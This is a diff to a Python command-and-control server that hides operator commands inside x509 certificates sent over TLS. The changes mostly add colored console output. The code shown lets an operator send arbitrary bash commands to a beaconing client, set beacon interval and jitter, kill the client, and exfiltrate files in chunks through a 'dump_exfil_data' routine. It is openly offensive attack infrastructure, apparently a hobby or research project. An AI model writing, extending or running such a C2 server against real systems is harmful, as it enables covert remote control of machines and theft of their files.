@@ -4,7 +4,7 @@ import ssl
 from pathlib import Path
 from cryptography import x509
 from codetiming import Timer
-from cert_gen import gen_msg_cert, get_cert_msg, init_cert_gen
+from cert_gen import gen_msg_cert, get_cert_msg, init_cert_gen, Colors
 
 timer = Timer(name="class")
 last_time = 0.0
@@ -49,13 +49,13 @@ def dump_exfil_data(cert, output_dir):
     # write bytes per second
     this_time = time.perf_counter() - timer._start_time
     bytes_per_sec = chuck_len / (this_time - last_time)
-    print(f"Writing {len(msg_data)} bytes of {file_name} ({bytes_per_sec} bytes/second)")
+    print(f"{Colors.LIGHT_CYAN}Writing {len(msg_data)} bytes of {file_name} ({bytes_per_sec} bytes/second){Colors.ENDC}")
     last_time = this_time
 
     if transfer_state == 3:
         close_file_handle(file_name)
         timer.stop()
-        print(f"Finished writing file {file_name}")
+        print(f"{Colors.LIGHT_CYAN}Finished writing file {file_name}{Colors.ENDC}")
     return transfer_state
 
 
@@ -90,6 +90,7 @@ def do_exfil(listen_addr, listen_port, ca_cert_path, cmd_cert, output_dir):
 
 def listen_for_client(listen_addr, listen_port, ca_cert_path, cmd_cert):
     """ Create a socket with the next command for the client """
+    print(f"{Colors.LIGHT_CYAN}Creating server side socket{Colors.ENDC}")
     msg_cert, msg_key = cmd_cert
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
         server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -107,6 +108,7 @@ def listen_for_client(listen_addr, listen_port, ca_cert_path, cmd_cert):
             # send msg back
             # data = secure_sock.read(1024)
             # secure_sock.write(data)
+    print(f"{Colors.LIGHT_CYAN}Tearing down server side socket{Colors.ENDC}")
     return msg, data
 
 
@@ -132,16 +134,15 @@ def start_server(listen_addr, listen_port, cert_root_path, ca_cert_path, ca_key_
     while True:
         # listen for a client REQUEST
         cmd, data = get_next_cmd()
+        print()
         # if len(commands) > 0:
         #     cmd, data = commands.pop(0)
         # else:
         #     cmd, data = noop_cmd
-
         # print(f"next client command: '{cmd}: {data}'")
         cmd_cert = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg=cmd, data=data)
         client_msg, client_data = listen_for_client(listen_addr, listen_port, ca_cert_path, cmd_cert)
-        assert client_msg == "request" and client_data is None
-        print("client requested command")
+        assert client_msg == "beacon" and client_data is None
 
         if cmd == "exfil":
             # exfil sets up a special loop to pull down file chunks
@@ -153,32 +154,49 @@ def start_server(listen_addr, listen_port, cert_root_path, ca_cert_path, ca_key_
             if client_data:
                 client_data = client_data.strip()
                 client_data = client_data.split("\n")
-                print(f"client response:")
+                print()
+                print(f"{Colors.LIGHT_YELLOW}client response:{Colors.ENDC}")
                 for line in client_data:
-                    print(f"\t{line}")
+                    print(f"{Colors.LIGHT_YELLOW}\t{line}{Colors.ENDC}")
 
 
 def get_next_cmd():
     print()
     while True:
-        cmd_type = input("Enter a command type ('bash', 'exfil', 'kill'): ").strip()
+        cmd_type = input(f"{Colors.LIGHT_GREEN}Enter a command type ('bash', 'exfil', 'kill'): {Colors.ENDC}").strip()
         if cmd_type == "bash":
-            cmd_data = input("enter the bash command: ").strip()
+            cmd_data = input(f"{Colors.LIGHT_GREEN}Enter the bash command: {Colors.ENDC}").strip()
             return cmd_type, cmd_data
         elif cmd_type == "wait":
-            interval = input("enter beacon interval: ").strip()
-            jitter = input("enter beacon jitter: ").strip()
+            interval = input(f"{Colors.LIGHT_GREEN}Enter beacon interval: {Colors.ENDC}").strip()
+            jitter = input(f"{Colors.LIGHT_GREEN}Enter beacon jitter: {Colors.ENDC}").strip()
             return cmd_type, f"{interval},{jitter}"
         elif cmd_type == "exfil":
-            cmd_data = input("enter file path: ").strip()
+            cmd_data = input(f"{Colors.LIGHT_GREEN}Enter file path: {Colors.ENDC}").strip()
             return cmd_type, cmd_data
         elif cmd_type == "kill":
             return cmd_type, None
         else:
-            print("Invalid command type, please try again")
+            print(f"{Colors.RED}Invalid command type, please try again{Colors.ENDC}")
+
 
 
 def main():
+    # print(f"{Colors.RED}Generating x509 cert with message{Colors.ENDC}")
+    # print(f"{Colors.GREEN}Generating x509 cert with message{Colors.ENDC}")
+    # print(f"{Colors.YELLOW}Generating x509 cert with message{Colors.ENDC}")
+    # print(f"{Colors.BLUE}Generating x509 cert with message{Colors.ENDC}")
+    # print(f"{Colors.PURPLE}Generating x509 cert with message{Colors.ENDC}")
+    # print(f"{Colors.CYAN}Generating x509 cert with message{Colors.ENDC}")
+    # print(f"{Colors.LIGHT_GREY}Generating x509 cert with message{Colors.ENDC}")
+    # print(f"{Colors.GREY}Generating x509 cert with message{Colors.ENDC}")
+    # print(f"{Colors.LIGHT_RED}Generating x509 cert with message{Colors.ENDC}")
+    # print(f"{Colors.LIGHT_GREEN}Generating x509 cert with message{Colors.ENDC}")
+    # print(f"{Colors.LIGHT_YELLOW}Generating x509 cert with message{Colors.ENDC}")
+    # print(f"{Colors.LIGHT_BLUE}Generating x509 cert with message{Colors.ENDC}")
+    # print(f"{Colors.LIGHT_PURPLE}Generating x509 cert with message{Colors.ENDC}")
+    # print(f"{Colors.LIGHT_CYAN}Generating x509 cert with message{Colors.ENDC}")
+    # print(f"{Colors.WHITE}Generating x509 cert with message{Colors.ENDC}")
     listen_addr = '127.0.0.1'
     listen_port = 8089
     passphrase = b'hackerman'
